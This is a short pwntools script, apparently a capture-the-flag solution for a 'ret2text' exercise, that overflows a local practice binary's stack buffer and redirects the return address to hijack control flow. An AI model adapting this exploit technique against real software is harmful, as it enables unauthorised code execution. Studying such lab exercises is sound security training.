from pwn import *
from pwnlib.util.packing import p32

sh = process('binary/ret2text')
target = 0x804863a
payload = b'A' * (0x6c+4) + p32(target)
sh.sendline(payload)
sh.interactive() 
